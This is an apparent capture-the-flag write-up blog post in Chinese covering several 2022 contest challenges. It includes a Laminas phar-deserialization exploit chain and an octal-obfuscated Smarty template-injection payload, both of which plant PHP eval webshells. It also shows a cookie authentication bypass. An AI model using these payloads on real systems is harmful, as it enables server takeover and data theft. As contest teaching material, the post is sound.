@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>红明谷2022部分wp | A10ng_&#39;s Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="WEB Fan website 根据题目描述，发现这是一个zf框架，网上有很多链子，但是需要一个入口点，在首页没有发现 啥有用的玩意儿。 扫描目录，得到源码，www.zi">
+<meta name="author" content="admin">
+<link rel="canonical" href="https://a10nggg.github.io/archives/198/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css" integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://a10nggg.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://a10nggg.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://a10nggg.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://a10nggg.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://a10nggg.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://a10nggg.github.io/archives/198/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="红明谷2022部分wp" />
+<meta property="og:description" content="WEB Fan website 根据题目描述，发现这是一个zf框架，网上有很多链子，但是需要一个入口点，在首页没有发现 啥有用的玩意儿。 扫描目录，得到源码，www.zi" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://a10nggg.github.io/archives/198/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-03-22T12:26:12+00:00" />
+<meta property="article:modified_time" content="2022-03-22T12:26:12+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="红明谷2022部分wp"/>
+<meta name="twitter:description" content="WEB Fan website 根据题目描述，发现这是一个zf框架，网上有很多链子，但是需要一个入口点，在首页没有发现 啥有用的玩意儿。 扫描目录，得到源码，www.zi"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://a10nggg.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "红明谷2022部分wp",
+      "item": "https://a10nggg.github.io/archives/198/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "红明谷2022部分wp",
+  "name": "红明谷2022部分wp",
+  "description": "WEB Fan website 根据题目描述，发现这是一个zf框架，网上有很多链子，但是需要一个入口点，在首页没有发现 啥有用的玩意儿。 扫描目录，得到源码，www.zi",
+  "keywords": [
+    
+  ],
+  "articleBody": "WEB Fan website 根据题目描述，发现这是一个zf框架，网上有很多链子，但是需要一个入口点，在首页没有发现\n啥有用的玩意儿。\n扫描目录，得到源码，www.zip。\n下载审计，发现这是一个mvc框架，个人感觉路由比较恶心。\n根据路由进入目录，发现有几个功能点。\n直接放图吧。。\n分别查看具体方法的代码。在imgdelete方法这里发现unlink。这个函数可以触发反序列化，但是需要上传phar。\npublic function imgdeleteAction() { $request = $this-\u003egetRequest(); if(isset($request-\u003egetPost()['imgpath'])){ $imgpath = $request-\u003egetPost()['imgpath']; $base = substr($imgpath,-4,4); if(in_array($base,$this-\u003ewhite_list)){ //白名单 @unlink($imgpath); }else{ echo 'Only Img File Can Be Deleted!'; } } } 很不巧的是这里有个上传点。\npublic function imguploadAction() { $form = new UploadForm('upload-form'); $request = $this-\u003egetRequest(); if ($request-\u003eisPost()) { // Make certain to merge the $_FILES info! $post = array_merge_recursive( $request-\u003egetPost()-\u003etoArray(), $request-\u003egetFiles()-\u003etoArray() ); $form-\u003esetData($post); if ($form-\u003eisValid()) { $data = $form-\u003egetData(); $base = substr($data[\"image-file\"][\"name\"],-4,4); if(in_array($base,$this-\u003ewhite_list)){ //白名单限制 $cont = file_get_contents($data[\"image-file\"][\"tmp_name\"]); if (preg_match(\"/\u003c\\?|php|HALT\\_COMPILER/i\", $cont )) { die(\"Not This\"); } if($data[\"image-file\"][\"size\"]\u003c3000){ die(\"The picture size must be more than 3kb\"); } $img_path = realpath(getcwd()).'/public/img/'.md5($data[\"image-file\"][\"name\"]).$base; echo $img_path; $form-\u003esaveImg($data[\"image-file\"][\"tmp_name\"],$img_path); }else{ echo 'Only Img Can Be Uploaded!'; } // Form is valid, save the form! //return $this-\u003eredirect()-\u003etoRoute('upload-form/success'); } } return ['form' =\u003e $form]; } 但是这里有些过滤，绕过去就行了。最离谱的是过滤了php标签，和HALT_COMPILER，这里就没办法传phar进去， 这里get了一个新知识点，把生成的phar文件，用gzip打包，不影响反序列化。\nexp:\n\u003c?php namespace Laminas\\View\\Resolver{ class TemplateMapResolver{ protected $map = [\"setBody\"=\u003e\"system\"]; } } namespace Laminas\\View\\Renderer{ class PhpRenderer{ private $__helpers; function __construct(){ $this-\u003e__helpers = new \\Laminas\\View\\Resolver\\TemplateMapResolver(); } } } namespace Laminas\\Log\\Writer{ abstract class AbstractWriter{} class Mail extends AbstractWriter{ protected $eventsToMail = [\"echo PD9waHAgZXZhbCgkX1BPU1RbMF0pOw==|base64 -d \u003epublic/img/1.php\"]; protected $subjectPrependText = null; protected $mail; function __construct(){ $this-\u003email = new \\Laminas\\View\\Renderer\\PhpRenderer(); } } } namespace Laminas\\Log{ class Logger{ protected $writers; function __construct(){ $this-\u003ewriters = [new \\Laminas\\Log\\Writer\\Mail()]; } } } namespace{ $a = new \\Laminas\\Log\\Logger(); echo urlencode(serialize($a)); unserialize(serialize($a)); @unlink(\"phar.phar\"); $phar = new Phar(\"phar.phar\"); //后缀名必须为phar $phar-\u003estartBuffering(); $phar-\u003esetStub(\"\u003c?php __HALT_COMPILER(); ?\u003e\"); //设置stub $o = $a; $phar-\u003esetMetadata($o); //将自定义的meta-data存入manifest $phar-\u003eaddFromString(\"test.txt\", str_repeat(\"testtesttest\",999999)); //添加要压缩的文件 //签名自动计算 $phar-\u003estopBuffering(); // echo base64_encode(serialize(new Logger())); } 生成好phar之后，用gzip打包，就能传上去了。\n在删除这里POST:\nimgpath=phar:///var/www/public/img/a7c3ce076585477741d951d179ab07dc.jpg\n然后就会写入webshell。然后直接读flag就行了。\nSmarty_calculator 首页毛都没有，无奈扫目录，发现www.zip。遂审计。\nindex.php对cookie有判断，是否存在cookie是否存在login，这里加个cookie：login=1就能绕过。\n这里data传进去之后被 Smarty的display方法处理。\n因为包含了Smarty/Smarty.class.php。跟进寻找 Smarty-\u003edisplay();这里的Smarty继承了Smarty_Internal_TemplateBase，在Smarty里没有找到display();跟进Smarty_Internal_TemplateBase；类\npublic function display($template = null, $cache_id = null, $compile_id = null, $parent = null) { // display template $this-\u003e_execute($template, $cache_id, $compile_id, $parent, 1); } 这里dispaly调用了_execute方法，继续更进_execute。\n审到这里似曾相识，原来是smarty存在模板注入，(CVE-2021-26120)\n参考链接：https://srcincite.io/blog/2021/02/18/smarty-template-engine-multiple-sandbox-escape-vulnerabilities.html\n然后可以直接利用，但是这里对输入内容有过滤。\n需要绕一下。这里转成八进制数，这种东西还是很好绕的。\npayload：\neval:{$x=\"42\"}{math equation=\"(\\\"\\\\146\\\\151\\\\154\\\\145\\\\137\\\\160\\\\165\\\\164\\\\137\\\\143\\\\157\\\\156\\\\164\\\\145\\\\156\\\\164\\\\163\\\")(\\\"\\\\61\\\\62\\\\63\\\\56\\\\160\\\\150\\\\160\\\",\\\"\\\\74\\\\77\\\\160\\\\150\\\\160\\\\40\\\\145\\\\166\\\\141\\\\154\\\\50\\\\44\\\\137\\\\122\\\\105\\\\121\\\\125\\\\105\\\\123\\\\124\\\\133\\\\47\\\\141\\\\141\\\\141\\\\47\\\\135\\\\51\\\\73\\\\77\\\\76\\\")\"}\n然后蚁剑连接就ok了。\nMISC 公众号发送问卷得到flag。\nMissingFile 好像被攻击者入侵了，但是赶到现场的时候，已经只剩下一个空的文件夹了，快照能找到攻击者留下的秘密吗？ 直接strings得到flag（感觉是非预期）\n# strings memory | grep flag{ flag{Hide_Behind_Windows} flag{Hide_Behind_Windows} flag{Hide_Behind_Windows} flag{Hide_Behind_Windows} 重要系统 题目内容：我们获取到了一个重要的目标环境！尝试获取其中的重要信息吧！ （本题容器下发后的端口是ssh端口，ssh的账号密码请分析附件后得到） hint1：流量包似乎是攻击者在探测溢出点和RIP？ 分析流量，在后面发现一堆usb流量，查看发现好像是键盘流量。\n直接跑脚本得到键盘记录的流量，分析他输入的内容，得到ssh、账密为:player:guest。\n[+] Found : kkkjjaaadjjjhaaaaajdhkkjjhhaakkkwangwanglovellanllnaansshplayer@172.2.0.2yesguesthhhdddfsssssdfffhhsssssfhsssssdffsssssddvvvvvhssssssfvkkjhhkkvvvsssjjjjaagfffggsddffssddfuppoouuukkkaahhhfflkkddddddj 这里ssh连接时需要ctrl c一下终止操作实现逃逸，然后就一直在想如何提权到比赛结束了，试了下grep没想到里面真就藏有flag (⊙﹏⊙)\n",
+  "wordCount" : "1552",
+  "inLanguage": "en",
+  "datePublished": "2022-03-22T12:26:12Z",
+  "dateModified": "2022-03-22T12:26:12Z",
+  "author":{
+    "@type": "Person",
+    "name": "admin"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://a10nggg.github.io/archives/198/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "A10ng_'s Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://a10nggg.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://a10nggg.github.io/" accesskey="h" title="A10ng_&#39;s Blog (Alt + H)">A10ng_&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://a10nggg.github.io/" title="首页">
+                    <span>首页</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/posts/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/categories/" title="分类">
+                    <span>分类</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/tags/" title="标签">
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/about/" title="关于">
+                    <span>关于</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/search/" title="搜索">
+                    <span>搜索</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      红明谷2022部分wp
+    </h1>
+    <div class="post-meta"><span title='2022-03-22 12:26:12 +0000 +0000'>March 22, 2022</span>&nbsp;·&nbsp;admin
+
+</div>
+  </header> 
+  <div class="post-content"><h1 id="web">WEB<a hidden class="anchor" aria-hidden="true" href="#web">#</a></h1>
+<h2 id="fan-website">Fan website<a hidden class="anchor" aria-hidden="true" href="#fan-website">#</a></h2>
+<p>根据题目描述，发现这是一个zf框架，网上有很多链子，但是需要一个入口点，在首页没有发现</p>
+<p>啥有用的玩意儿。</p>
+<p>扫描目录，得到源码，www.zip。</p>
+<p>下载审计，发现这是一个mvc框架，个人感觉路由比较恶心。</p>
+<p>根据路由进入目录，发现有几个功能点。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="505" height="303" src="/uploads/2022/03/1647945649887.png" alt="" class="wp-image-200" srcset="/uploads/2022/03/1647945649887.png 505w, /uploads/2022/03/1647945649887-300x180.png 300w" sizes="(max-width: 505px) 100vw, 505px" /> </figure></p>
+<p>直接放图吧。。<figure class="wp-block-image"></p>
+<p><img loading="lazy" src="http://101.42.226.85/uploads/2022/03/1647945758883.png" alt="此图片的alt属性为空；文件名为1647945758883.png"  />
+ </figure></p>
+<p>分别查看具体方法的代码。在imgdelete方法这里发现unlink。这个函数可以触发反序列化，但是需要上传phar。</p>
+<pre class="wp-block-code"><code> public function imgdeleteAction()
+    {
+        $request = $this-&gt;getRequest();
+        if(isset($request-&gt;getPost()&#91;'imgpath'])){
+            $imgpath = $request-&gt;getPost()&#91;'imgpath'];
+            $base = substr($imgpath,-4,4);
+            if(in_array($base,$this-&gt;white_list)){     //白名单
+                @unlink($imgpath);
+            }else{
+                echo 'Only Img File Can Be Deleted!';
+            }
+        }
+    }</code></pre>
+<p>很不巧的是这里有个上传点。</p>
+<pre class="wp-block-code"><code>    public function imguploadAction()
+    {
+        $form = new UploadForm('upload-form');
+
+        $request = $this-&gt;getRequest();
+        if ($request-&gt;isPost()) {
+            // Make certain to merge the $_FILES info!
+            $post = array_merge_recursive(
+                $request-&gt;getPost()-&gt;toArray(),
+                $request-&gt;getFiles()-&gt;toArray()
+            );
+
+            $form-&gt;setData($post);
+            if ($form-&gt;isValid()) {
+                $data = $form-&gt;getData();
+                $base = substr($data&#91;"image-file"]&#91;"name"],-4,4);
+                if(in_array($base,$this-&gt;white_list)){   //白名单限制
+                    $cont = file_get_contents($data&#91;"image-file"]&#91;"tmp_name"]);
+                    if (preg_match("/&lt;\?|php|HALT\_COMPILER/i", $cont )) {
+                        die("Not This");
+                    }
+                    if($data&#91;"image-file"]&#91;"size"]&lt;3000){
+                        die("The picture size must be more than 3kb");
+                    }
+                    $img_path = realpath(getcwd()).'/public/img/'.md5($data&#91;"image-file"]&#91;"name"]).$base;
+                    echo $img_path;
+                    $form-&gt;saveImg($data&#91;"image-file"]&#91;"tmp_name"],$img_path);
+                }else{
+                    echo 'Only Img Can Be Uploaded!';
+                }
+                // Form is valid, save the form!
+                //return $this-&gt;redirect()-&gt;toRoute('upload-form/success');
+            }
+        }
+
+        return &#91;'form' =&gt; $form];
+    }</code></pre>
+<p>但是这里有些过滤，绕过去就行了。最离谱的是过滤了php标签，和HALT_COMPILER，这里就没办法传phar进去， 这里get了一个新知识点，把生成的phar文件，用gzip打包，不影响反序列化。</p>
+<p>exp:</p>
+<pre class="wp-block-code"><code>&lt;?php
+
+namespace Laminas\View\Resolver{
+    class TemplateMapResolver{
+        protected $map = &#91;"setBody"=&gt;"system"];
+    }
+}
+namespace Laminas\View\Renderer{
+    class PhpRenderer{
+        private $__helpers;
+        function __construct(){
+            $this-&gt;__helpers = new \Laminas\View\Resolver\TemplateMapResolver();
+        }
+    }
+}
+
+
+namespace Laminas\Log\Writer{
+    abstract class AbstractWriter{}
+
+    class Mail extends AbstractWriter{
+        protected $eventsToMail = &#91;"echo PD9waHAgZXZhbCgkX1BPU1RbMF0pOw==|base64 -d &gt;public/img/1.php"];
+
+        protected $subjectPrependText = null;
+        protected $mail;
+        function __construct(){
+            $this-&gt;mail = new \Laminas\View\Renderer\PhpRenderer();
+        }
+    }
+}
+
+namespace Laminas\Log{
+    class Logger{
+        protected $writers;
+        function __construct(){
+            $this-&gt;writers = &#91;new \Laminas\Log\Writer\Mail()];
+        }
+    }
+}
+
+
+namespace{
+    $a = new \Laminas\Log\Logger();
+    echo urlencode(serialize($a));
+    unserialize(serialize($a));
+    @unlink("phar.phar");
+    $phar = new Phar("phar.phar"); //后缀名必须为phar
+    $phar-&gt;startBuffering();
+    $phar-&gt;setStub("&lt;?php __HALT_COMPILER(); ?&gt;"); //设置stub
+    $o = $a;
+    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest
+    $phar-&gt;addFromString("test.txt", str_repeat("testtesttest",999999)); //添加要压缩的文件
+//签名自动计算
+    $phar-&gt;stopBuffering();
+//    echo base64_encode(serialize(new Logger()));
+}</code></pre>
+<p>生成好phar之后，用gzip打包，就能传上去了。</p>
+<p>在删除这里POST:</p>
+<p><code>imgpath=phar:///var/www/public/img/a7c3ce076585477741d951d179ab07dc.jpg</code><figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="921" height="466" src="/uploads/2022/03/1647946518197.png" alt="" class="wp-image-201" srcset="/uploads/2022/03/1647946518197.png 921w, /uploads/2022/03/1647946518197-300x152.png 300w, /uploads/2022/03/1647946518197-768x389.png 768w" sizes="(max-width: 921px) 100vw, 921px" /> </figure></p>
+<p>然后就会写入webshell。然后直接读flag就行了。</p>
+<h2 id="smarty_calculator"><strong>Smarty_calculator</strong><a hidden class="anchor" aria-hidden="true" href="#smarty_calculator">#</a></h2>
+<p>首页毛都没有，无奈扫目录，发现www.zip。遂审计。</p>
+<p>index.php对cookie有判断，是否存在cookie是否存在login，这里加个cookie：login=1就能绕过。</p>
+<p>这里data传进去之后被 Smarty的display方法处理。</p>
+<p>因为包含了Smarty/Smarty.class.php。跟进寻找 Smarty-&gt;display();这里的Smarty继承了Smarty_Internal_TemplateBase，在Smarty里没有找到display();跟进Smarty_Internal_TemplateBase；类</p>
+<pre class="wp-block-code"><code>    public function display($template = null, $cache_id = null, $compile_id = null, $parent = null)
+    {
+        // display template
+        $this-&gt;_execute($template, $cache_id, $compile_id, $parent, 1);
+    }</code></pre>
+<p>这里dispaly调用了_execute方法，继续更进_execute。</p>
+<p>审到这里似曾相识，原来是smarty存在模板注入，(CVE-2021-26120)</p>
+<p>参考链接：https://srcincite.io/blog/2021/02/18/smarty-template-engine-multiple-sandbox-escape-vulnerabilities.html</p>
+<p>然后可以直接利用，但是这里对输入内容有过滤。</p>
+<p>需要绕一下。这里转成八进制数，这种东西还是很好绕的。</p>
+<p>payload：</p>
+<p><code>eval:{$x=&quot;42&quot;}{math equation=&quot;(\&quot;\\146\\151\\154\\145\\137\\160\\165\\164\\137\\143\\157\\156\\164\\145\\156\\164\\163\&quot;)(\&quot;\\61\\62\\63\\56\\160\\150\\160\&quot;,\&quot;\\74\\77\\160\\150\\160\\40\\145\\166\\141\\154\\50\\44\\137\\122\\105\\121\\125\\105\\123\\124\\133\\47\\141\\141\\141\\47\\135\\51\\73\\77\\76\&quot;)&quot;}</code></p>
+<p>然后蚁剑连接就ok了。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="742" height="373" src="/uploads/2022/03/1647950862230.png" alt="" class="wp-image-202" srcset="/uploads/2022/03/1647950862230.png 742w, /uploads/2022/03/1647950862230-300x151.png 300w" sizes="(max-width: 742px) 100vw, 742px" /> </figure></p>
+<h1 id="misc">MISC<a hidden class="anchor" aria-hidden="true" href="#misc">#</a></h1>
+<p>公众号发送问卷得到flag。</p>
+<h2 id="missingfile">MissingFile<a hidden class="anchor" aria-hidden="true" href="#missingfile">#</a></h2>
+<blockquote class="wp-block-quote">
+  <p>
+    好像被攻击者入侵了，但是赶到现场的时候，已经只剩下一个空的文件夹了，快照能找到攻击者留下的秘密吗？
+  </p>
+</blockquote>
+<p>直接strings得到flag（感觉是非预期）</p>
+<pre class="wp-block-code"><code># strings memory | grep flag{
+flag{Hide_Behind_Windows}
+flag{Hide_Behind_Windows}
+flag{Hide_Behind_Windows}
+flag{Hide_Behind_Windows}</code></pre>
+<h2 id="重要系统">重要系统<a hidden class="anchor" aria-hidden="true" href="#重要系统">#</a></h2>
+<blockquote class="wp-block-quote">
+  <p>
+    题目内容：我们获取到了一个重要的目标环境！尝试获取其中的重要信息吧！
+  </p>
+  <p>
+    （本题容器下发后的端口是ssh端口，ssh的账号密码请分析附件后得到）
+  </p>
+  <p>
+    hint1：流量包似乎是攻击者在探测溢出点和RIP？
+  </p>
+</blockquote>
+<p>分析流量，在后面发现一堆usb流量，查看发现好像是键盘流量。</p>
+<p>直接跑脚本得到键盘记录的流量，分析他输入的内容，得到ssh、账密为:player:guest。</p>
+<pre class="wp-block-code"><code>&#91;+] Found : kkkjjaaadjjjhaaaaajdhkkjjhhaakkk&lt;DEL&gt;wangwang&lt;RET&gt;lovellanllna&lt;DEL&gt;&lt;DEL&gt;an&lt;RET&gt;ssh&lt;SPACE&gt;player@172.2.0.2&lt;RET&gt;yes&lt;RET&gt;guest&lt;RET&gt;hhhdddfsssssdfffhhsssssfhsssssdffsssssddvvvvvhssssssfvkkjhhkkvvvsssjjjjaagfffggsddffssddfuppoouuukkkaahhhfflkkddddddj</code></pre>
+<p>这里ssh连接时需要<code>ctrl c</code>一下终止操作实现逃逸，然后就一直在想如何提权到比赛结束了，试了下grep没想到里面真就藏有flag (⊙﹏⊙)<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" width="1024" height="391" src="/uploads/2022/03/320a217721a0da1aa44c6f8c4f717eb-1024x391.png" alt="" class="wp-image-203" srcset="/uploads/2022/03/320a217721a0da1aa44c6f8c4f717eb-1024x391.png 1024w, /uploads/2022/03/320a217721a0da1aa44c6f8c4f717eb-300x115.png 300w, /uploads/2022/03/320a217721a0da1aa44c6f8c4f717eb-768x294.png 768w, /uploads/2022/03/320a217721a0da1aa44c6f8c4f717eb-1536x587.png 1536w, /uploads/2022/03/320a217721a0da1aa44c6f8c4f717eb.png 1719w" sizes="(max-width: 1024px) 100vw, 1024px" /> </figure></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2024 <a href="https://a10nggg.github.io/">A10ng_&#39;s Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
